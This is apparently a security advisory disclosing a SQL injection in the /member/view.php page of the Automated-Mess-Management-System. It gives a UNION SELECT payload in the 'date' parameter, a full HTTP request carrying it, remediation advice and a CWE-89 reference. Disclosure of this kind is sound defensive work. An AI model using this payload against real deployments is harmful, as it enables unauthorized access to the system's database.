# boyiddha / Automated-Mess-Management-System - /member/view.php SQL Injection

## Vendor Homepage:
[Automated-Mess-Management-System](https://github.com/boyiddha/Automated-Mess-Management-System)

## Impact
The SQL Injection vulnerability in the Automated-Mess-Management-System's login functionality allows attackers to execute arbitrary SQL queries, potentially leading to unauthorized access to sensitive data or functionalities, including the admin panel. This poses a significant risk of data breaches and unauthorized actions within the system.

## Proof of Concept
Step 1: Login as a member.\
Step 2: Navigate to "/member/view.php?date='+UNION+SELECT+@@version,null,null,'nochizplz',null+%23"\
Step 3: The page will return the database version, confirming the successful SQL Injection.

## HTTP Request Example
``` http request
GET /member/view.php?date='+UNION+SELECT+@@version,null,null,'nochizplz',null+%23 HTTP/1.1
Host: [REDACTED]
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: [REDACTED]
Connection: close
```
## Proof with Screenshot


## Remidiation
To address this issue, developers should implement strict input validation and utilize parameterized queries to prevent SQL Injection attacks. Additionally, access controls should be properly enforced to limit users' privileges and mitigate the impact of potential injection attacks. Regular security assessments and code reviews can help identify and remediate such vulnerabilities effectively.

## CWE
[CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)
